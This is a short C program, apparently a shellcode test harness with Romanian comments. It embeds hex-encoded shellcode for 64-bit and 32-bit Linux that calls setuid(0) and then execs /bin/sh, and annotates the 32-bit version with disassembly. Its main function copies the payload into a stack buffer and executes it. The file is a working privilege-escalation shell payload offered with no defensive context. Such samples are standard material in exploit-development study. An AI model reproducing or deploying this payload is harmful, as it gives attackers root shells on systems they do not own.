#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"

  //shellcode cu setuid(0)
const char shellcode[] =
#if __x86_64__
 "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
  "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
  "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
  "\x58\x0f\x05";   //shellcode cu setuid(0)
#else
                               // <_start>:
    "\x31\xdb"                  // xor    %ebx,%ebx
    "\x6a\x17"                  // push   $0x17
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\xf7\xe3"                  // mul    %ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xcd\x80"                  // int    $0x80       //shellcode cu setuid(0)
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}

